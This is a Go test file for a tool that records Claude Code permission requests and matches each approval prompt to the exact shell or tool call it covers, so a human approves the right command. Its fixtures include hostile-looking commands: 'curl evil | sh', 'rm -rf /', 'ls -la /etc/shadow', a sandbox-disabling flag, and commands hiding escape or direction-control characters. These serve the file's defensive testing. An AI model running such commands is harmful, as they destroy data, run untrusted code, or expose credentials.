package shift

import (
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/iamnikolie/zmina/internal/crew"
)

// permissionInput is what Claude Code hands a PermissionRequest hook for a shell call.
func permissionInput(session, command string) []byte {
	return []byte(`{"session_id":"` + session + `","hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":` +
		jsonString(command) + `,"description":"clean up"}}`)
}

func jsonString(s string) string {
	r := strings.NewReplacer(`\`, `\\`, `"`, `\"`, "\n", `\n`)

	return `"` + r.Replace(s) + `"`
}

// lastPermission is the newest call of a role's permission file.
func lastPermission(t *testing.T, l crew.Layout) AskedPermission {
	t.Helper()

	recs := permissionCalls(t, l)
	require.NotEmpty(t, recs)

	return recs[len(recs)-1]
}

func permissionCalls(t *testing.T, l crew.Layout) []AskedPermission {
	t.Helper()

	var have permissionRecords

	require.True(t, readRecord(l.HookPermission("dev"), &have))

	return have.Records
}

// A permission prompt as Claude Code draws it: the command is above the question, and the same words follow every time.
const permissionScreen = " Bash command\n\n   rm -rf build\n   clean up\n\nDo you want to proceed?\n❯ 1. Yes\n" +
	"  2. Yes, and don't ask again for rm commands in /work/example\n  3. No, and tell Claude what to do differently (esc)\n" +
	"Enter to select · ↑/↓ to navigate · Esc to cancel"

// permissionScreenOf is the prompt of a shell call: its command is drawn above the question.
func permissionScreenOf(command string) string {
	return strings.Replace(permissionScreen, "rm -rf build", command, 1)
}

// A PermissionRequest for a tool call becomes the role's permission record: the tool, what it was asked to do (cut), and a sum of
// the whole input. AskUserQuestion has its own record, and anything that is not a call records nothing.
func TestRecordPermissionWritesTheCall(t *testing.T) {
	l := crew.Layout{Dir: t.TempDir()}
	at := time.Date(2026, 10, 24, 12, 0, 0, 0, time.UTC)

	require.NoError(t, RecordPermission(l, "dev", permissionInput("sid-dev", "rm -rf build"), at))

	got := lastPermission(t, l)
	assert.Equal(t, "sid-dev", got.SessionID)
	assert.Equal(t, at, got.At)
	assert.Equal(t, "Bash", got.Tool)
	assert.Equal(t, "rm -rf build", got.Input, "a shell call's command")
	assert.Len(t, got.InputSum, 16)

	info, err := os.Stat(l.HookPermission("dev"))
	require.NoError(t, err)
	assert.Equal(t, os.FileMode(0o600), info.Mode().Perm())

	// The same call, spaced otherwise, has the same sum; another command, or the same one in another directory of input, another.
	first := got.InputSum
	require.NoError(t, RecordPermission(l, "dev", []byte(strings.Replace(string(permissionInput("sid-dev", "rm -rf build")), `,"description":"clean up"`, ` , "description" : "clean up"`, 1)), at))
	got = lastPermission(t, l)
	assert.Equal(t, first, got.InputSum)

	require.NoError(t, RecordPermission(l, "dev", permissionInput("sid-dev", "rm -rf ~/x"), at))
	got = lastPermission(t, l)
	assert.NotEqual(t, first, got.InputSum)

	// What is not a shell call is said by its path or its input; a long one is cut, its sum is of all of it.
	require.NoError(t, RecordPermission(l, "dev", []byte(`{"session_id":"s","tool_name":"Write","tool_input":{"file_path":"/work/example/a.txt","content":"`+strings.Repeat("x", 5000)+`"}}`), at))
	got = lastPermission(t, l)
	assert.Equal(t, "Write", got.Tool)
	assert.Equal(t, "/work/example/a.txt", got.Input)

	require.NoError(t, RecordPermission(l, "dev", []byte(`{"session_id":"s","tool_name":"mcp__x__send","tool_input":{"to":"`+strings.Repeat("y", 3000)+`"}}`), at))
	got = lastPermission(t, l)
	assert.Len(t, []rune(got.Input), permissionInputMax, "cut")

	// A command with a control character in it is one clean line.
	require.NoError(t, RecordPermission(l, "dev", permissionInput("s", "echo a\x1b[2J\nrm -rf /"), at))
	got = lastPermission(t, l)
	assert.NotContains(t, got.Input, "\x1b")
	assert.NotContains(t, got.Input, "\n")
}

func TestRecordPermissionLeavesEverythingElseAlone(t *testing.T) {
	at := time.Date(2026, 10, 24, 12, 0, 0, 0, time.UTC)

	for name, tc := range map[string]struct{ role, input string }{
		"a question":  {"dev", askedInput},
		"not json":    {"dev", "not json"},
		"nothing":     {"dev", ""},
		"no session":  {"dev", strings.Replace(string(permissionInput("x", "ls")), `"session_id":"x",`, "", 1)},
		"no tool":     {"dev", `{"session_id":"s","tool_input":{}}`},
		"a path role": {"../x", string(permissionInput("s", "ls"))},
		"no role":     {"", string(permissionInput("s", "ls"))},
	} {
		t.Run(name, func(t *testing.T) {
			l := crew.Layout{Dir: t.TempDir()}

			require.NoError(t, RecordPermission(l, tc.role, []byte(tc.input), at))
			assert.NoDirExists(t, l.Hooks())
		})
	}
}

// A permission prompt whose call the hook recorded carries what is being approved, and the fingerprint covers it: the screen says
// "Do you want to proceed?" under every command, and two commands must never share an id.
func TestPermissionDialogCarriesItsSubjectInItsFingerprint(t *testing.T) {
	f := fixtureWith(t, crewYAML)
	require.NoError(t, f.s.Up("designer"))
	f.waitingOn("designer", "permission prompt")
	f.tm.screen = permissionScreen

	screenOnly := ParseDialog(permissionScreen)
	require.NotNil(t, screenOnly)

	// No record: the screen's dialog as before, with no subject.
	bare := dialogOf(t, f, "designer")
	require.NotNil(t, bare)
	assert.Equal(t, screenOnly.ID, bare.ID)
	assert.Empty(t, bare.Subject)
	assert.Empty(t, bare.Tool)

	require.NoError(t, RecordPermission(f.s.Crew.Layout(), "designer", permissionInput("sid-designer", "rm -rf build"), *f.now))

	one := dialogOf(t, f, "designer")
	require.NotNil(t, one)
	assert.Equal(t, "Bash", one.Tool)
	assert.Equal(t, "rm -rf build", one.Subject)
	assert.NotEqual(t, screenOnly.ID, one.ID, "the fingerprint is of the call too")
	assert.Equal(t, screenOnly.Options, one.Options)

	// Another command under the very same words, in a wait of its own, is another dialog.
	*f.now = f.now.Add(time.Minute)
	f.waitingOn("designer", "permission prompt")
	f.tm.screen = permissionScreenOf("rm -rf ~/x")
	require.NoError(t, RecordPermission(f.s.Crew.Layout(), "designer", permissionInput("sid-designer", "rm -rf ~/x"), *f.now))

	two := dialogOf(t, f, "designer")
	require.NotNil(t, two)
	assert.Equal(t, "rm -rf ~/x", two.Subject)
	assert.NotEqual(t, one.ID, two.ID, "two commands never share an id")

	// The press reads the screen again and must come to the same id.
	assert.Equal(t, two.ID, f.s.DialogOn("designer", permissionScreenOf("rm -rf ~/x")).ID)
	assert.Nil(t, f.s.DialogOn("designer", "nothing a parse takes for a question"))
	assert.Nil(t, f.s.DialogOn("nobody", permissionScreen))
}

// A record that is not this prompt's is nothing: another session's, one of an earlier prompt, one a question waits beside.
func TestPermissionRecordMustBeThisPromptsToBeShown(t *testing.T) {
	f := fixtureWith(t, crewYAML)
	require.NoError(t, f.s.Up("designer"))
	f.tm.screen = permissionScreen
	screenOnly := ParseDialog(permissionScreen)

	for name, tc := range map[string]struct {
		waiting string
		session string
		at      time.Duration
	}{
		"another session":             {"permission prompt", "sid-other", 0},
		"an earlier prompt":           {"permission prompt", "sid-designer", -10 * time.Second},
		"a later prompt":              {"permission prompt", "sid-designer", 10 * time.Second},
		"the session asks a question": {"input needed", "sid-designer", 0},
		"the session does not say":    {"", "sid-designer", 0},
	} {
		t.Run(name, func(t *testing.T) {
			require.NoError(t, os.RemoveAll(f.s.Crew.Layout().Hooks()))
			f.waitingOn("designer", tc.waiting)
			require.NoError(t, RecordPermission(f.s.Crew.Layout(), "designer", permissionInput(tc.session, "rm -rf build"), f.now.Add(tc.at)))

			d := dialogOf(t, f, "designer")
			require.NotNil(t, d)
			assert.Empty(t, d.Subject, "nothing says what is being approved")
			assert.Equal(t, screenOnly.ID, d.ID)
		})
	}

	// A role that starts again has none of its old session's.
	f.waitingOn("designer", "permission prompt")
	require.NoError(t, RecordPermission(f.s.Crew.Layout(), "designer", permissionInput("sid-designer", "ls"), *f.now))
	require.FileExists(t, f.s.Crew.Layout().HookPermission("designer"))
	f.s.dropHookRecords("designer")
	assert.NoFileExists(t, f.s.Crew.Layout().HookPermission("designer"))
}

// A question whose choices are ticked, not taken, says so: pressing one choice of it settles nothing.
func TestMultipleChoiceDialogsSayTheyAre(t *testing.T) {
	boxedScreen := " ☐ Tabs\n│ Which tabs?\n❯ 1. ☐ Home\n  2. ☐ Talk\n  3. Type something.\nEnter to select · ↑/↓ to navigate · Esc to cancel"

	f := fixtureWith(t, crewYAML)
	require.NoError(t, f.s.Up("designer"))
	f.waitingOn("designer", "input needed")
	f.tm.screen = boxedScreen

	d := dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.True(t, d.Multi, "every choice is boxed")

	// A single choice is not.
	f.tm.screen = askedScreen
	d = dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.False(t, d.Multi)

	// The call says several can be chosen.
	multi := strings.Replace(askedInput, `"multiSelect":false`, `"multiSelect":true`, 1)
	require.NoError(t, RecordQuestion(f.s.Crew.Layout(), "designer", []byte(multi), *f.now))

	d = dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.True(t, d.Multi)
}

// The file keeps the last few calls of a role, not the last: eight at most, none dropped for its age before a day; hooks of parallel
// requests run at once and none of them is lost. What it lets go of it remembers (Lost).
func TestPermissionFileKeepsTheLastFewCalls(t *testing.T) {
	l := crew.Layout{Dir: t.TempDir()}
	at := time.Date(2026, 10, 24, 12, 0, 0, 0, time.UTC)

	for i := range 12 {
		require.NoError(t, RecordPermission(l, "dev", permissionInput("sid-dev", "echo "+string(rune('a'+i))), at.Add(time.Duration(i)*time.Second)))
	}

	recs := permissionCalls(t, l)
	require.Len(t, recs, permissionKeep)
	assert.Equal(t, "echo e", recs[0].Input, "the oldest of the last eight")
	assert.Equal(t, "echo l", recs[len(recs)-1].Input)

	var have permissionRecords

	require.True(t, readRecord(l.HookPermission("dev"), &have))
	assert.True(t, have.Lost.Equal(at.Add(3*time.Second)), "the newest it let go of: %v", have.Lost)

	// A call is not dropped for its age before a day: a prompt may stand for hours, and its call is what says what it is.
	require.NoError(t, RecordPermission(l, "dev", permissionInput("sid-dev", "echo next"), at.Add(12*time.Hour)))
	assert.Equal(t, "echo f", permissionCalls(t, l)[0].Input, "only the cap let one go")

	// A day on, a call goes with the next, and the file says so.
	l3 := crew.Layout{Dir: t.TempDir()}
	require.NoError(t, RecordPermission(l3, "dev", permissionInput("sid-dev", "echo old"), at))
	require.NoError(t, RecordPermission(l3, "dev", permissionInput("sid-dev", "echo new"), at.Add(permissionAge+time.Minute)))

	recs = permissionCalls(t, l3)
	require.Len(t, recs, 1)
	assert.Equal(t, "echo new", recs[0].Input)
	require.True(t, readRecord(l3.HookPermission("dev"), &have))
	assert.True(t, have.Lost.Equal(at))

	// Hooks that run at once lose nothing.
	l2 := crew.Layout{Dir: t.TempDir()}

	var wg sync.WaitGroup

	for i := range 6 {
		wg.Add(1)

		go func() {
			defer wg.Done()

			assert.NoError(t, RecordPermission(l2, "dev", permissionInput("sid-dev", "echo "+string(rune('a'+i))), at))
		}()
	}

	wg.Wait()
	assert.Len(t, permissionCalls(t, l2), 6)
}

// A prompt whose call the file may have had to let go of is nobody's: the same call asked nine times in one wait loses its first
// record to the cap, and what was lost may have been the call of this wait.
func TestAPromptWhoseRecordWasLetGoIsNotTold(t *testing.T) {
	f := fixtureWith(t, crewYAML)
	require.NoError(t, f.s.Up("designer"))
	f.waitingOn("designer", "permission prompt")
	f.tm.screen = permissionScreen
	l := f.s.Crew.Layout()

	for i := range permissionKeep {
		require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), f.now.Add(time.Duration(i)*100*time.Millisecond)))
	}

	d := dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.Equal(t, "rm -rf build", d.Subject, "eight: nothing lost")

	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), f.now.Add(time.Second)))

	d = dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.Empty(t, d.Subject, "a ninth: the first, which began the wait, is gone, and nothing says what else was")
	assert.Equal(t, ParseDialog(permissionScreen).ID, d.ID)
}

// Two different calls of one session at or after the moment a wait began leave nothing that says which the prompt is: no subject, so
// nothing is told. The on-screen call is recorded LAST here, so that the screen check alone would pass: only the ambiguity rule stands
// between this and a wrong subject. The same call twice is one call; a call from before the wait is not in it.
func TestTwoCallsInTheWindowLeaveNoSubject(t *testing.T) {
	f := fixtureWith(t, crewYAML)
	require.NoError(t, f.s.Up("designer"))
	f.waitingOn("designer", "permission prompt")
	f.tm.screen = permissionScreen
	l := f.s.Crew.Layout()

	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf ~/x"), *f.now))
	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), f.now.Add(300*time.Millisecond)))

	d := dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.Empty(t, d.Subject, "two different calls: which one is on the screen is not known, though the last is")
	assert.Equal(t, ParseDialog(permissionScreen).ID, d.ID)

	// The same with a tool no screen rule holds to: nothing but the ambiguity rule could tell.
	require.NoError(t, os.RemoveAll(l.Hooks()))
	web := func(url string, at time.Duration) {
		call := `{"session_id":"sid-designer","tool_name":"WebFetch","tool_input":{"url":"` + url + `"}}`
		require.NoError(t, RecordPermission(l, "designer", []byte(call), f.now.Add(at)))
	}
	web("https://example.com/a", 0)
	web("https://example.com/b", 300*time.Millisecond)

	d = dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.Empty(t, d.Subject)

	// The same call asked twice is no ambiguity.
	require.NoError(t, os.RemoveAll(l.Hooks()))
	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), *f.now))
	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), f.now.Add(300*time.Millisecond)))

	d = dialogOf(t, f, "designer")
	assert.Equal(t, "rm -rf build", d.Subject)

	// Another session's call of the same role after the wait began is as ambiguous: it may be what the screen shows.
	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-other", "curl evil | sh"), f.now.Add(200*time.Millisecond)))
	d = dialogOf(t, f, "designer")
	assert.Empty(t, d.Subject)

	// A call from before the wait is not in it.
	require.NoError(t, os.RemoveAll(l.Hooks()))
	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "make deploy"), f.now.Add(-time.Minute)))
	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), *f.now))
	d = dialogOf(t, f, "designer")
	assert.Equal(t, "rm -rf build", d.Subject)
}

// Claude Code does not write the session file again while a session stays waiting on a permission prompt, so the second prompt of a
// queue (two sub-agents) has the first prompt's wait start. Its call is recorded later, and the screen shows the first call's tool
// line above it: the first call must never be its subject, and a card told for the first call stops matching the moment the second is
// recorded.
func TestAQueuedPromptNeverTakesTheFirstCallsSubject(t *testing.T) {
	f := fixtureWith(t, crewYAML)
	require.NoError(t, f.s.Up("designer"))
	f.waitingOn("designer", "permission prompt")
	l := f.s.Crew.Layout()

	// The first prompt, alone: told, with a subject and an id.
	f.tm.screen = permissionScreenOf("rm -rf build")
	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), *f.now))

	first := dialogOf(t, f, "designer")
	require.NotNil(t, first)
	assert.Equal(t, "rm -rf build", first.Subject)
	assert.True(t, first.SubjectChecked)

	// A second request is recorded while the first prompt is up: the first's id is no more.
	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "git push --force origin main"), f.now.Add(5*time.Second)))

	again := dialogOf(t, f, "designer")
	require.NotNil(t, again)
	assert.Empty(t, again.Subject, "two calls since the wait began: nothing says which is on the screen")
	assert.NotEqual(t, first.ID, again.ID, "a card told before the second call was recorded stops matching")

	// The owner answers the first at the keyboard; the second comes up with the first's tool line above it, the file unchanged.
	f.tm.screen = "⏺ Bash(rm -rf build)\n  ⎿  (No output)\n\n" + permissionScreenOf("git push --force origin main")

	second := dialogOf(t, f, "designer")
	require.NotNil(t, second)
	assert.Empty(t, second.Subject, "the second prompt has no subject: not the first call's, and not certain to be the second's")
	assert.Equal(t, ParseDialog(f.tm.screen).ID, second.ID)

	// A tool no screen rule holds to, the very same: queued MCP calls.
	require.NoError(t, os.RemoveAll(l.Hooks()))
	f.tm.screen = permissionScreen

	call := func(tool string, at time.Duration) {
		in := `{"session_id":"sid-designer","tool_name":"` + tool + `","tool_input":{"channel":"general","text":"hi all"}}`
		require.NoError(t, RecordPermission(l, "designer", []byte(in), f.now.Add(at)))
	}
	call("mcp__chat__read_channel", 0)
	call("mcp__chat__send_message", 5*time.Second)

	d := dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.Empty(t, d.Subject, "the second call of the queue is on the screen: not the first's, and not told")
}

// A shell call's prompt is the block between its title and its question, and the whole of the call (and its description) must be
// that block, word for word: not the head of it among the last lines, where the tool line of an earlier call stands too.
func TestAShellCallMustBeThePromptsWholeBlock(t *testing.T) {
	question := &Dialog{Question: "Do you want to proceed?"}
	call := func(command, desc string) *AskedPermission {
		return &AskedPermission{Tool: "Bash", Input: command, Desc: desc}
	}

	// The golden screens: the whole of the call, described, in a plain screen, a box and a ruled one.
	for _, name := range []string{"permission-bash", "permission-boxed", "permission-ruled"} {
		raw, err := os.ReadFile(filepath.Join("testdata", "screens", "claude", name+".txt"))
		require.NoError(t, err)
		assert.Equal(t, matchWhole, checkPermissionScreen(call("rm -rf build", "Remove the stale build directory"), string(raw), question), name)
		assert.Equal(t, matchNone, checkPermissionScreen(call("rm -rf build", ""), string(raw), question), name+": the description is part of what the prompt says")
		assert.Equal(t, matchNone, checkPermissionScreen(call("rm -rf build", "Something else"), string(raw), question), name)
	}

	plain := func(command string) string {
		return strings.Replace(permissionScreen, "rm -rf build\n   clean up", command, 1)
	}

	// A short command is not the head of a longer one (the review's `ls` on a screen of `rm -rf tools`, and on `ls -la /etc/shadow`).
	assert.Equal(t, matchNone, checkPermissionScreen(call("ls", ""), plain("rm -rf tools"), question))
	assert.Equal(t, matchNone, checkPermissionScreen(call("ls", ""), plain("ls -la /etc/shadow"), question))
	assert.Equal(t, matchNone, checkPermissionScreen(call("rm -rf build", ""), plain("rm -rf build-all"), question))
	assert.Equal(t, matchWhole, checkPermissionScreen(call("ls", ""), plain("ls"), question))

	// The tool line of an earlier call, above the title, is not the prompt's block.
	assert.Equal(t, matchNone, checkPermissionScreen(call("rm -rf build", ""), "⏺ Bash(rm -rf build)\n  ⎿  ok\n\n"+plain("git push --force origin main"), question))
	assert.Equal(t, matchWhole, checkPermissionScreen(call("git push --force origin main", ""), "⏺ Bash(rm -rf build)\n  ⎿  ok\n\n"+plain("git push --force origin main"), question))

	// A frame character in the command is stripped from both sides, not from one.
	assert.Equal(t, matchWhole, checkPermissionScreen(call("echo '── done ──'", ""), plain("echo '── done ──'"), question))
	assert.Equal(t, matchWhole, checkPermissionScreen(call("ps │ wc", ""), plain("ps │ wc"), question))

	// Wrapped through a word, or cut: the same words, but not so that they can be compared as they stand: not pressable.
	assert.Equal(t, matchPartial, checkPermissionScreen(call("git commit -m 'a long message'", ""), plain("git commit -m 'a lo\n   ng message'"), question))
	assert.Equal(t, matchPartial, checkPermissionScreen(call(clipRunes(strings.Repeat("a", 1200), permissionInputMax), ""),
		plain(strings.Repeat("a", 1200)), question), "the record was cut: the prompt shows more")

	// No title, no question, another tool.
	assert.Equal(t, matchNone, checkPermissionScreen(call("rm -rf build", ""), "rm -rf build\nDo you want to proceed?\n❯ 1. Yes", question))
	assert.Equal(t, matchNone, checkPermissionScreen(call("rm -rf build", ""), permissionScreen, &Dialog{}))
	assert.Equal(t, matchUnchecked, checkPermissionScreen(&AskedPermission{Tool: "WebFetch", Input: "https://example.com"}, permissionScreen, question))

	// A call of several lines is shown with its breaks, and the prompt draws them as lines.
	assert.Equal(t, matchWhole, checkPermissionScreen(call("echo ok ⏎ rm -rf ~/x", ""), plain("echo ok\n   rm -rf ~/x"), question))
}

// A shell call's dialog, from the goldens: the single normal prompt is checked word for word, and not cut.
func TestASingleShellPromptIsCheckedAndPressable(t *testing.T) {
	f := fixtureWith(t, crewYAML)
	require.NoError(t, f.s.Up("designer"))
	f.waitingOn("designer", "permission prompt")

	raw, err := os.ReadFile(filepath.Join("testdata", "screens", "claude", "permission-bash.txt"))
	require.NoError(t, err)

	f.tm.screen = string(raw)
	call := `{"session_id":"sid-designer","tool_name":"Bash","tool_input":{"command":"rm -rf build","description":"Remove the stale build directory"}}`
	require.NoError(t, RecordPermission(f.s.Crew.Layout(), "designer", []byte(call), *f.now))

	d := dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.Equal(t, "Bash", d.Tool)
	assert.Equal(t, "rm -rf build", d.Subject)
	assert.True(t, d.SubjectChecked)
	assert.False(t, d.SubjectCut)
}

// A subject that is not all of what is approved says so: cut, or with parts of the call it does not show.
func TestASubjectThatIsPartialSaysSo(t *testing.T) {
	l := crew.Layout{Dir: t.TempDir()}
	at := time.Date(2026, 10, 24, 12, 0, 0, 0, time.UTC)

	record := func(input string) AskedPermission {
		require.NoError(t, os.RemoveAll(l.Hooks()))
		require.NoError(t, RecordPermission(l, "dev", []byte(input), at))

		return lastPermission(t, l)
	}

	assert.False(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"ls"}}`).Cut)
	assert.False(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"ls","description":"list","timeout":5000}}`).Cut,
		"the call's own words for what it does, and its time limit, change nothing")
	assert.False(t, record(`{"session_id":"s","tool_name":"mcp__x__send","tool_input":{"to":"alex","body":"hi"}}`).Cut, "the whole input is the subject")

	assert.True(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"ls","dangerouslyDisableSandbox":true}}`).Cut,
		"a key the subject does not show and that changes what runs")
	assert.True(t, record(`{"session_id":"s","tool_name":"Write","tool_input":{"file_path":"/work/example/a.txt","content":"x"}}`).Cut,
		"the path is not the content")
	assert.True(t, record(`{"session_id":"s","tool_name":"Edit","tool_input":{"file_path":"/work/example/a.txt","old_string":"a","new_string":"b"}}`).Cut)

	// Several lines are several things to run: shown with their breaks, and not pressed. So is anything folding changed beyond the space
	// at its ends (a double space, a control character, a hidden mark).
	multi := record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"echo ok\nrm -rf ~/x"}}`)
	assert.Equal(t, "echo ok ⏎ rm -rf ~/x", multi.Input)
	assert.True(t, multi.Cut)
	assert.True(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"echo ok \u202e x; rm -rf ~/x\u001b[2K"}}`).Cut)
	assert.True(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"echo  two spaces"}}`).Cut)
	assert.False(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"  ls  \n"}}`).Cut, "the space at its ends is nothing")
	assert.Equal(t, "ls", lastPermission(t, l).Input)
	assert.Equal(t, "list", record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"ls","description":"list"}}`).Desc)

	pad := strings.Repeat(" ", 900)
	assert.True(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"`+strings.Repeat("a", 1100)+`"}}`).Cut, "cut at 1000")
	assert.False(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"ls`+pad+`"}}`).Cut, "white space is folded before it is counted")

	// The dialog says it.
	f := fixtureWith(t, crewYAML)
	require.NoError(t, f.s.Up("designer"))
	f.waitingOn("designer", "permission prompt")
	f.tm.screen = strings.Replace(permissionScreen, "rm -rf build\n   clean up", "rm -rf build", 1)
	require.NoError(t, RecordPermission(f.s.Crew.Layout(), "designer",
		[]byte(`{"session_id":"sid-designer","tool_name":"Bash","tool_input":{"command":"rm -rf build","dangerouslyDisableSandbox":true}}`), *f.now))

	d := dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.True(t, d.SubjectCut)
	assert.Equal(t, "rm -rf build", d.Subject)
	assert.True(t, d.SubjectChecked, "the screen shows all of what the subject says, and there is more to the call")
}
